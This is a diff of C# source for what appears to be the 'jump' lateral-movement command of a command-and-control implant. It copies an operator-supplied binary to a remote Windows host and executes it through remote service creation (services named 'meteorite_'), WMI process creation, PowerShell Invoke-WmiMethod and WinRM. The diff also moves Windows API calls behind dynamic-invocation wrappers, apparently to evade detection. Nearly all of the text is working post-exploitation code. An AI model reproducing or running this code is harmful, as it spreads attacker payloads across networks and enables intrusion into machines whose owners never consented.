@@ -1,19 +1,16 @@
-﻿using Engineer.Commands;
-using Engineer.Extra;
-using Engineer.Models;
-using System;
-using System.Collections.Generic;
+﻿using System;
+using System.IO;
 using System.Linq;
 using System.Management;
+using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using System.Text;
 using System.Threading.Tasks;
-using System.IO;
-using System.Management.Automation;
-using static System.Collections.Specialized.BitVector32;
-using Engineer.Functions;
+using DynamicEngLoading;
+
+using static DynamicEngLoading.h_DynInv_Methods;
+using static DynamicEngLoading.h_DynInv;
 
 namespace Engineer.Commands
 {
@@ -28,11 +25,11 @@ namespace Engineer.Commands
             if (task.Arguments.TryGetValue("/target", out string target))
             {
                 target = target.TrimStart(' ');
-                Tasking.FillTaskResults("Planning to jump to target " + target, task, EngTaskStatus.Running,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Planning to jump to target \n" + target, task, EngTaskStatus.Running,TaskResponseType.String);
             }
             else
             {
-                Tasking.FillTaskResults("error: " + "No target specified use /target <target>",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "No target specified use /target <target>\n", task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                 return;
             }
             if (task.Arguments.TryGetValue("/method", out string method))
@@ -41,22 +38,22 @@ namespace Engineer.Commands
                 //ignoring case if the method string does not equal psexec wmi winrm tell the user invalid method and print the valid methods
                 if (method.ToLower() == "psexec" || method.ToLower() == "wmi" || method.ToLower() == "winrm" || method.ToLower() == "wmi-ps" || method.ToLower() == "dcom")
                 {
-                    Tasking.FillTaskResults("Using method " + method, task, EngTaskStatus.Running,TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Using method \n" + method, task, EngTaskStatus.Running,TaskResponseType.String);
                 }
                 else
                 {
-                    Tasking.FillTaskResults("error: " + "Invalid method specified, valid methods are psexec, wmi, winrm, wmi-ps, dcom",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Invalid method specified, valid methods are psexec, wmi, winrm, wmi-ps, dcom\n", task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
             }
             else
             {
-                Tasking.FillTaskResults("error: " + "No method specified use /method <method>, valid methods are psexec, wmi, winrm, wmi-ps, dcom",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "No method specified use /method <method>, valid methods are psexec, wmi, winrm, wmi-ps, dcom\n", task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                 return;
             }
             if (task.File.Length < 1 || task.File == null)
             {
-                Tasking.FillTaskResults("error: no file provided",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: no file provided\n", task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                 return;
             }
             var binary = task.File;
@@ -82,7 +79,7 @@ namespace Engineer.Commands
             {
                 jumpDcom(target, binary);
             }
-            Tasking.FillTaskResults("Jumped",task,EngTaskStatus.Complete,TaskResponseType.String);
+            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Jumped",task,EngTaskStatus.Complete,TaskResponseType.String);
         }
 
         public static void jumpPsexec(string target, byte[] binary)
@@ -90,10 +87,10 @@ namespace Engineer.Commands
             try
             {
                 // open the service maanger on the target machine and create a new service with a random name that is set to run the binary and then start the service
-                IntPtr serviceManagerHandle = WinAPIs.Advapi.OpenSCManager(target, null, WinAPIs.Advapi.SC_MANAGER_ALL_ACCESS);
+                IntPtr serviceManagerHandle = AdvApi32FuncWrapper.OpenSCManager(target, null, Win32.Advapi32.SCM_ACCESS.SC_MANAGER_ALL_ACCESS);
                 if (serviceManagerHandle == IntPtr.Zero)
                 {
-                    Tasking.FillTaskResults("error: " + "Failed to open service manager on target machine" + target, currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Failed to open service manager on target machine\n" + target, currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
                 // split the binary path into the directory and the binary name, copy the binary name over to the target machine windows directory
@@ -108,34 +105,34 @@ namespace Engineer.Commands
                 //check if the file exists on the target machine, if it does not exist then return an error
                 if (!File.Exists(targetBinaryDirectory))
                 {
-                    Tasking.FillTaskResults("error: " + "Failed to copy binary to target machine" + target, currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Failed to copy binary to target machine\n" + target, currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
                 string targetBinary = targetBinaryDirectory;
 
 
                 string serviceName = "meteorite_" + Guid.NewGuid().ToString();
-                IntPtr serviceHandle = WinAPIs.Advapi.CreateService(serviceManagerHandle, serviceName, serviceName, WinAPIs.Advapi.SERVICE_NO_CHANGE, WinAPIs.Advapi.SERVICE_WIN32_OWN_PROCESS, WinAPIs.Advapi.SERVICE_AUTO_START, WinAPIs.Advapi.SERVICE_ERROR_NORMAL, targetBinary, null, null, null, null, null);
+                IntPtr serviceHandle = AdvApi32FuncWrapper.CreateService(serviceManagerHandle, serviceName, serviceName, Win32.Advapi32.SERVICE_ACCESS.SERVICE_ALL_ACCESS, Win32.Advapi32.SERVICE_TYPE.SERVICE_WIN32_OWN_PROCESS, Win32.Advapi32.SERVICE_START.SERVICE_AUTO_START, Win32.Advapi32.SERVICE_ERROR.SERVICE_ERROR_NORMAL, targetBinary, null, IntPtr.Zero, null, null, null);
                 if (serviceHandle == IntPtr.Zero)
                 {
-                    Tasking.FillTaskResults("error: " + $"Failed to create service on target machine\n Error: {Marshal.GetLastWin32Error()}", currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + $"Failed to create service on target machine\n Error: {Marshal.GetLastWin32Error()}\n", currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
-                if (WinAPIs.Advapi.StartService(serviceHandle, 0, null) == false)
+                if (AdvApi32FuncWrapper.StartService(serviceHandle, 0, null) == false)
                 {
-                    Tasking.FillTaskResults("error: " + $"Failed to start service on target" + target, currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + $"Failed to start service on target\n" + target, currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
-                Tasking.FillTaskResults("Successfully started service on target machine" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Successfully started service on target machine\n" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
                 // close the service manager
-                WinAPIs.Advapi.CloseServiceHandle(serviceManagerHandle);
+                AdvApi32FuncWrapper.CloseServiceHandle(serviceManagerHandle);
                 // close the service
-                WinAPIs.Advapi.CloseServiceHandle(serviceHandle);
+                AdvApi32FuncWrapper.CloseServiceHandle(serviceHandle);
 
             }
             catch (Exception e)
             {
-                Tasking.FillTaskResults($"{e.Message}" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"{e.Message}\n" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
             }
            
 
@@ -160,25 +157,25 @@ namespace Engineer.Commands
             //check if the file exists on the target machine, if it does not exist then return an error
             if (!File.Exists(targetBinaryDirectory))
             {
-                Tasking.FillTaskResults("error: " + "Failed to copy binary to target machine" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Failed to copy binary to target machine\n" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
                 return;
             }
-            Tasking.FillTaskResults($"copied binary {binaryName} to target machine" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
+            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"copied binary {binaryName} to target machine\n" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
             string targetBinary = targetBinaryDirectory;
 
             inParams["CommandLine"] = targetBinary;
             ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
-            Tasking.FillTaskResults("Created process on target machine" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
+            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Created process on target machine\n" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
         }
 
         public static void jumpWMIPS(string target, byte[] binary)
         {
             //create a powershell object and runner to execute Invoke-WmiMethod -class win32_process -computerName target -name create -argumentList binary
-            Tasking.FillTaskResults("Testing WMi-Connection and Uploading binary to target Windows dir and then Invoking WMI via powershell to run target binary" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
+            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Testing WMi-Connection and Uploading binary to target Windows dir and then Invoking WMI via powershell to run target binary\n" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
             string testConnection = $"Get-WmiObject -query \"SELECT * FROM Win32_OperatingSystem\" -ComputerName {target}";
             if (!RunPs(testConnection))
             {
-                Tasking.FillTaskResults("error: Failed to connect to the target machine" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: Failed to connect to the target machine\n" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
                 return;
             }
             //create random name for the binary
@@ -191,7 +188,7 @@ namespace Engineer.Commands
             //check if the file exists on the target machine, if it does not exist then return an error
             if (!File.Exists(targetBinaryDirectory))
             {
-                Tasking.FillTaskResults($"error: Failed to copy binary {binaryName} to target machine" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"error: Failed to copy binary {binaryName} to target machine\n" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
                 return;
             }
             string targetBinary = targetBinaryDirectory;
@@ -199,7 +196,7 @@ namespace Engineer.Commands
             string command = $"Invoke-WmiMethod -class win32_process -computerName {target} -name create -argumentList {targetBinary}";
             if (!RunPs(command))
             {
-                Tasking.FillTaskResults("error: Failed to start binary on target machine" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: Failed to start binary on target machine\n" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
                 return;
             }
         }
@@ -210,7 +207,7 @@ namespace Engineer.Commands
             var conn = new WSManConnectionInfo(uri);
             if (conn.ConnectionUri != null)
             {
-                Tasking.FillTaskResults("Successfully connected to target machine at " + conn.ConnectionUri, currentTask, EngTaskStatus.Running,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Successfully connected to target machine at \n" + conn.ConnectionUri, currentTask, EngTaskStatus.Running,TaskResponseType.String);
             }
 
             string binaryb64 = Convert.ToBase64String(binary);
